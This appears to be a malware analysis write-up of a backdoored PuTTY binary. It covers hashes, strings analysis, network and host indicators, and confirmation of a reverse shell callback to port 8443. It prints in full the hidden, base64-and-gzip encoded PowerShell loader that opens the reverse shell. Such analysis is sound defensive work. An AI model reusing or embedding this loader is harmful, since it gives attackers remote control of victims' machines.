## File Hash & VT Analysis

0c82e654c09c8fd9fdf4899718efa37670974c9eec5a8fc18a167f93cea6ee83 *putty.exe
334a10500feb0f3444bf2e86ab2e76da *putty.exe

VT Analysis: 58/71 Infected

According to VT it is a malicious binary

## Architecture 

32 bit binary

## Basic Static Analysis

This binary didn't gave the interesting strings outright, It was a bit tricky to find but we can use the commands
`floss -n 8 putty.exe`
Which will check the strings greater than or equal to 8 bits.

Or we can grep the strings like cmd, powershell from the floss output.
`grep powershell putty.exe`
![8bac67277002064747b3bd7647d3e44e.png](https://github.com/r3gent05/MalwareAnalysis-/blob/main/Putty.exe%20Backdoor%20Malware/images/19ffa0f567be4a439eee2953ea1fdcb1.png)

Strings & Floss output

![b1b349a624c278aa4bd39569a57ffb2a.png](https://github.com/r3gent05/MalwareAnalysis-/blob/main/Putty.exe%20Backdoor%20Malware/images/c03a4c455fd94f6fafd9867763e23ce4.png)

```
powershell.exe -nop -w hidden -noni -ep bypass "&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAOW/UWECA51W227jNhB991cMXHUtIRbhdbdAESCLepVsGyDdNVZu82AYCE2NYzUyqZKUL0j87yUlypLjBNtUL7aGczlz5kL9AGOxQbkoOIRwK1OtkcN8B5/Mz6SQHCW8g0u6RvidymTX6RhNplPB4TfU4S3OWZYi19B57IB5vA2DC/iCm/Dr/G9kGsLJLscvdIVGqInRj0r9Wpn8qfASF7TIdCQxMScpzZRx4WlZ4EFrLMV2R55pGHlLUut29g3EvE6t8wjl+ZhKuvKr/9NYy5Tfz7xIrFaUJ/1jaawyJvgz4aXY8EzQpJQGzqcUDJUCR8BKJEWGFuCvfgCVSroAvw4DIf4D3XnKk25QHlZ2pW2WKkO/ofzChNyZ/ytiWYsFe0CtyITlN05j9suHDz+dGhKlqdQ2rotcnroSXbT0Roxhro3Dqhx+BWX/GlyJa5QKTxEfXLdK/hLyaOwCdeeCF2pImJC5kFRj+U7zPEsZtUUjmWA06/Ztgg5Vp2JWaYl0ZdOoohLTgXEpM/Ab4FXhKty2ibquTi3USmVx7ewV4MgKMww7Eteqvovf9xam27DvP3oT430PIVUwPbL5hiuhMUKp04XNCv+iWZqU2UU0y+aUPcyC4AU4ZFTope1nazRSb6QsaJW84arJtU3mdL7TOJ3NPPtrm3VAyHBgnqcfHwd7xzfypD72pxq3miBnIrGTcH4+iqPr68DW4JPV8bu3pqXFRlX7JF5iloEsODfaYBgqlGnrLpyBh3x9bt+4XQpnRmaKdThgYpUXujm845HIdzK9X2rwowCGg/c/wx8pk0KJhYbIUWJJgJGNaDUVSDQB1piQO37HXdc6Tohdcug32fUH/eaF3CC/18t2P9Uz3+6ok4Z6G1XTsxncGJeWG7cvyAHn27HWVp+FvKJsaTBXTiHlh33UaDWw7eMfrfGA1NlWG6/2FDxd87V4wPBqmxtuleH74GV/PKRvYqI3jqFn6lyiuBFVOwdkTPXSSHsfe/+7dJtlmqHve2k5A5X5N6SJX3V8HwZ98I7sAgg5wuCktlcWPiYTk8prV5tbHFaFlCleuZQbL2b8qYXS8ub2V0lznQ54afCsrcy2sFyeFADCekVXzocf372HJ/ha6LDyCo6KI1dDKAmpHRuSv1MC6DVOthaIh1IKOR3MjoK1UJfnhGVIpR+8hOCi/WIGf9s5naT/1D6Nm++OTrtVTgantvmcFWp5uLXdGnSXTZQJhS6f5h6Ntcjry9N8eXQOXxyH4rirE0J3L9kF8i/mtl93dQkAAA=='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))"
```

When I found the PowerShell one-liner payload I noticed two things it is base64 encoded and there is some kind of compression. We can decode the base64 payload and then try to find out what type of compression is it.

![3fdac8a37271cff291b77b26c32779df.png](https://github.com/r3gent05/MalwareAnalysis-/blob/main/Putty.exe%20Backdoor%20Malware/images/8b2d136ed9e24951863b680f02a04635.png)

It is gzip compressed we can decompress and analyze it further.

![36854a07cc8f64fb22fe66d7dc404d60.png](https://github.com/r3gent05/MalwareAnalysis-/blob/main/Putty.exe%20Backdoor%20Malware/images/883e879246044d1ca523b94c821b277e.png)

After analyzing further we found the payload is invoking a reverse shell in the target and it is using a SSL certificate with the host bonus2.corporatebonusapplication.local

## IAT & PE view

## Windows API calls
- ShellExec

But we can't be completely sure since this is a backdoor which is using actual putty binary. 

It does not looks like a packed binary

## Basic Dynamic Analysis

## Initial Detonation
On initial detonation with or without inetsim a PowerShell windows is opened in the background and the usual putty interface.
![78db26ae9b5a0e3030a52cd66df57aaa.png](https://github.com/r3gent05/MalwareAnalysis-/blob/main/Putty.exe%20Backdoor%20Malware/images/49c2c73bfe4548d3b873d0aa7a5bab62.png)

## Network signatures
A DNS record: bonus2.corporatebonusapplication.local: type A, class IN
![881a282dcc7f6fd732b01134bfa69bef.png](https://github.com/r3gent05/MalwareAnalysis-/blob/main/Putty.exe%20Backdoor%20Malware/images/b8202da4f7d3487bbc3f5850aa7bdb7b.png)

On further analysis, I found out it is making a TCP call back on port 8443 looks. Looks the reverse is calling back at port 8443.

## Host Indicators
When selecting the Parent PID of putty in procmon I found out. It has indeed a PowerShell child process spawned. A PowerShell based payload is spawned at the time of executing the binary we can use the procmon to findout.

![f51697a00e8ac0b0081a22392a3934af.png](https://github.com/r3gent05/MalwareAnalysis-/blob/main/Putty.exe%20Backdoor%20Malware/images/ba273678fc564611910b0b05c08e25ff.png)

![da89ab050657e7ba009abaecaf9b742a.png](https://github.com/r3gent05/MalwareAnalysis-/blob/main/Putty.exe%20Backdoor%20Malware/images/73153948a40e4265a629c23b256cc21b.png)

We can confirm the callback port with tcpview
![f4252f5b159797d19d906799573ff850.png](https://github.com/r3gent05/MalwareAnalysis-/blob/main/Putty.exe%20Backdoor%20Malware/images/5f102222a1364693bbdda6350c230bbd.png)
Now that we know the binary is making a callback on the host bonus2.corporatebonusapplication.local on port 8443 we can edit the /etc/host file and get a reverse shell that will prove our theory.

![77845fa761785b2e91039491dd4e4c84.png](https://github.com/r3gent05/MalwareAnalysis-/blob/main/Putty.exe%20Backdoor%20Malware/images/7a889bc38eab467dbcce23a008ec5ac9.png) 

After configuring the hosts file and configuring a listener I ran the binary again and got a connection. 

![9849f4de7492333542fc1a71f6cd089a.png](https://github.com/r3gent05/MalwareAnalysis-/blob/main/Putty.exe%20Backdoor%20Malware/images/e2df592976cd4c60acff3e7e17cb0130.png)

I was seeing the garbage data because the reverse shell is using a SSL certificate and we don't have a valid SSL certificate. But indeed it is proved it is a putty revershell backdoor RAT.
